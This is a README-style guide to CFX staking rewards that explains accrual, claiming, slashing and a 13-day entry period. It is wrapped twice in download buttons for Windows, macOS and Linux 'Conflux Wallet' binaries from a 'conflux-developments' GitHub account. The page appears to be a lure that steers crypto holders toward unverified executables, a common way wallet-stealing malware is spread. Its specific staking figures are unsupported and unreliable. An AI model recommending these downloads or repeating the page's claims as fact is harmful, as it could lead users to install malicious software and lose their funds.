![Conflux Wallet](assets/banner-article.png)

# CFX Staking Rewards

<p align="center">CFX Staking Rewards: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Staked CFX earns interest for as long as it secures finality, and the wallet shows the accrued amount beside the staked and spendable balances. No fixed rate is published here, because the return varies by mechanism and period - anyone quoting one number for all conditions is guessing.

## Where the reward comes from

Proof-of-stake finality is paid for out of the network's economics: locked CFX backs votes, votes finalise blocks, and the positions behind them accrue interest. The reward is a protocol payment, not a company's promise. A staking position is therefore a bet on network conditions rather than on an operator's solvency, which is a materially different kind of risk.

That distinction decides what can go wrong. There is no counterparty to default, and equally there is no one to complain to if the rate falls - the rate is a function of network conditions, and it moves.

## Why no rate is quoted

Published figures disagree. The documentation and the operator's own filings do not state the same number, and a rate depends on the period and the mechanism being described, so quoting one would be picking a side in a disagreement that has not been resolved.

The honest answer to "what does staking pay?" is a range with conditions attached, or a pointer to the live figure in the interface. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md covers the mechanics the rate applies to.

## Building your own estimate

Take the amount you intend to stake, the rate the interface currently shows, and the time the position will actually be earning - which is the staked period minus the 13 days it takes to reach staking status. Multiply, and treat the result as an estimate rather than a promise.

The subtraction is what most calculators skip, and it matters enormously at short horizons. A month-long stake earns for about seventeen days; a two-week stake earns for one.

## Claiming

Accrued interest appears as a reward balance beside the staked and spendable ones, and moving it into spendable CFX is a Core Space transaction with its own small fee - https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-gas-and-fees.md covers what that fee is made of. If the interface offers no separate action, the balance shown is the accrued total and nothing is waiting to be collected.

Either way, nothing is lost by leaving it. Interest sits with the position rather than expiring, so claiming is a convenience rather than a deadline.

## Why a claim fails

Three reasons, usually. The fee has to come from the Core Space account, so an account whose CFX is entirely staked cannot pay for the claim. The position may not have reached staking status yet, so there is nothing accrued. Or the app is pointed at eSpace, where no reward exists to claim.

The first is the common one, and it has the same shape as the bridge problem: everything was committed, and the transaction that would release value needs a little value. Leave a small spendable balance.

## Can a pool lose your stake?

A pool can lose you money in one specific way: if the node it runs is slashed, the accounts voting for it lose part of their stake permanently. That is a protocol rule, not a pool's discretion, and no operator can promise it away.

What a pool cannot do is take custody of your CFX. The stake stays locked by the protocol against your account, with your keys; the operator controls a node, not your funds. A service that asks you to send CFX to an address it controls is not a staking pool, it is a transfer.

## Rewards and the 13-day status

Nothing accrues as a full position until the entry period completes. During those 13 days the CFX is committed and producing nothing of substance, which is why a stake intended for a short period is a poor trade even at an attractive headline rate.

If the reward balance stays at zero on a fresh position, that is the explanation, and it resolves itself. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md covers the matching delay on the way out.

## Reading the numbers

In the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14), the wallet separates staked, unlocking and reward balances from spendable CFX because they have different availabilities, and reading them as one total is how people conclude that staking lost them money. That separation is the most useful thing on the screen when something looks wrong.

Add them up and the sum should reconcile with what you committed plus what accrued. If it does not, check whether a position was slashed - https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md is the check order for everything else.

## What moves the return

The rate set by network conditions, the length of time actually earning, whether the position stayed continuously staked, and whether the node was slashed. Only the second is under your control, and it is the one most often ignored.

So the practical lever is duration, not timing. Staking for a long period at an average rate beats chasing a short period at a good one, because the entry cost of 13 days is paid either way. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md is worth reading if you hold CFX on the wrong side to stake it. The project is actively maintained, so the build to compare against is whatever the release page lists today.

## FAQ

### What rate does CFX staking pay?

No single figure: the return varies by mechanism and period, and published numbers disagree. Read the live rate in the interface and treat any fixed quote with suspicion.

### How do I claim staking rewards?

Move the reward balance into spendable CFX from the staking view. It is a Core Space transaction, so keep a little spendable CFX to pay for it.

### Can I lose my staked CFX in a pool?

Only through slashing of the node you voted for, which is permanent. A pool never takes custody - the stake stays locked against your own account.

### Why is my reward balance zero?

The position has not finished its 13-day entry, or the app is showing eSpace, where nothing is staked.

### Is there a staking calculator?

Several, and they usually ignore the 13-day entry. Subtract it from the earning period before trusting any projection.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md)
- [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
